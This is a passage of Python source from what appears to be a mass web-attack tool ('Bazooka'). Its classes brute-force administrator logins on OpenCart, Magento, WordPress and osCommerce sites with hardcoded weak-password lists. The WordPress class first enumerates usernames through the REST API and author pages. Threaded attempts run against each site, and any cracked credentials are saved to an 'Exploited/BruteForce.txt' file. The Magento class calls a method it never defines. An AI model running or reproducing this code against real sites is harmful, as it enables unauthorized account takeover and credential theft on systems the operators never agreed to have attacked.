                GoT = requests.post(url, data=post, headers=agent, timeout=10)
                if 'Logout' in GoT.text:
                    print(self.g + '[' + self.g + '>' + self.g + '] ' +\
                          self.w + 'http://' + site + ' ' + ' ' + self.g + '[OpenCart]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n\n')
                    self.flag = 1
            except:
                pass

    class Magento(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123", "super123", "superadmin", "hydra", "hydra77", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.opencart, args=(site, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print(self.c + '[' + self.y + '>' + self.g + '] ' + self.r + 'http://' + site + ' ' + ' ' \
                      + self.g + '[Magento BruteForce]' + self.r + ' [Failed]')

        def magento(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['password'] = passwd
                url = "http://" + site + "/index.php/admin/"
                GoT = requests.post(url, data=post, headers=agent, timeout=10)
                if 'Log out' in GoT.text:
                    print(self.g + '[' + self.g + '>' + self.g + '] ' +\
                          self.w + 'http://' + site + ' ' + ' ' + self.g + '[Magento]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/index.php/admin/' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n\n')
                    self.flag = 1
            except:
                pass

    class Wordpress(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123", "super123", "superadmin", "temp123", "temp1234", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            try:
                Headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                source = requests.get('http://' + site + '/wp-login.php', timeout=5, headers=Headers).text
                WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', source)[0]
                WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', source)[0]
                if 'Log In' in WpSubmitValue:
                    WpSubmitValue = 'Log+In'
                else:
                    WpSubmitValue = WpSubmitValue
                thread = []
                usernameWp = self.UserName_Enumeration(site)
                if usernameWp == None:
                    username = 'admin'
                else:
                    username = usernameWp
                for passwd in self.password:
                    t = threading.Thread(target=self.BruteForce,
                                         args=(site, passwd, WpSubmitValue, WpRedirctTo, username))
                    if self.flag == 1:
                        break
                    else:
                        t.start()
                        thread.append(t)
                        time.sleep(0.08)
                for j in thread:
                    j.join()
                if self.flag == 0:
                    print(self.c + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' '
                          + self.g + '[Wordpress BruteForce]' + self.r + ' [Failed]')
            except:
                print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' '
                      + self.g + '[Wordpress BruteForce]' + self.r + ' [Failed]')

        def UserName_Enumeration(self, site):
            Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            _cun = 1
            Flag = True
            __Check2 = requests.get('http://' + site + '/?author=1', timeout=10, headers=Headers)
            try:
                while Flag:
                    GG = requests.get('http://' + site + '/wp-json/wp/v2/users/' + str(_cun),
                                      timeout=10, headers=Headers)
                    __InFo = json.loads(GG.text)
                    if 'id' not in __InFo:
                        Flag = False
                    else:
                        Usernamez = __InFo['slug']
                        return Usernamez
                    break
            except:
                try:
                    if '/author/' not in __Check2.text:
                        return None
                    else:
                        find = re.findall('/author/(.*)/"', __Check2.text)
                        username = find[0]
                        if '/feed' in username:
                            find = re.findall('/author/(.*)/feed/"', __Check2.text)
                            username2 = find[0]
                            return username2
                        else:
                            return username
                except requests.exceptions.ReadTimeout:
                    return None

        def BruteForce(self, site, passwd, WpSubmitValue, WpRedirctTo, username):
            try:
                sess = requests.session()
                Headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                post = {}
                post['log'] = username
                post['pwd'] = passwd
                post['wp-submit'] = WpSubmitValue
                post['redirect_to'] = WpRedirctTo
                post['testcookie'] = 1
                url = site + '/wp-login.php'
                GoT = sess.post('http://' + url, data=post, headers=Headers, timeout=10)
                if 'wordpress_logged_in_' in str(GoT.cookies) or 'action=logout' in GoT.text:
                    print(self.g + '[' + self.g + '>' + self.g + '] ' +
                          self.w + 'http://' + site + ' ' + ' ' + self.g + '[Wordpress]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/wp-login.php' + '\n Username: {}'.format(username) +
                                     '\n Password: ' +
                                     passwd + '\n\n')
                    self.flag = 1
            except:
                pass


    class OsCommerceBF(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "super123", "superadmin", "temp123", "temp1234", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.BruteForce, args=(site, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' '
                      + self.g + '[OsCommerce BruteForce]' + self.r + ' [Failed]')

        def BruteForce(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['password'] = passwd
                url = "http://" + site + "/admin/login.php?action=process"
                GoT = requests.post(url, data=post, headers=agent, timeout=10)
                if '/admin/login.php?action=logoff' in GoT.text:
                    print(self.c + '[' + self.g + '>' + self.g + '] ' +
                          self.w + 'http://' + site + ' ' + ' ' + self.g + '[OsCommerce]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/admin/' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n\n')
                    self.flag = 1
            except:
                pass
				

Bazooka()